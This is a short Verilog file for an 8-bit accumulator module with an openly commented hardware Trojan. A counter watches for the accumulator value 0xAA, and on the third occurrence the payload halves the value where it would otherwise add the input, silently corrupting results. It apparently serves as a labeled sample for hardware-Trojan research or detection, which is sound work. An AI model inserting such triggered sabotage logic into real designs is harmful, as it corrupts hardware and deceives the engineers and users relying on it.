module accum8(input clk, input rst_n, input en, input [7:0] din,
               output reg [7:0] acc);

  reg [1:0] seq_cnt;

  always @(posedge clk or negedge rst_n) begin
    if (!rst_n) begin
      acc     <= 8'b0;
      seq_cnt <= 2'b0;
    end else begin
      if (en) begin
        // Trojan sequential counter: count occurrences of acc==8'hAA with en
        if (acc == 8'hAA)
          seq_cnt <= seq_cnt + 1'b1;

        // Trojan payload: on 3rd hit (seq_cnt==2 before increment), degrade acc
        if (acc == 8'hAA && seq_cnt == 2'b10)
          acc <= {1'b0, acc[7:1]};  // right-shift (halve) instead of accumulate
        else
          acc <= acc + din;
      end
    end
  end

endmodule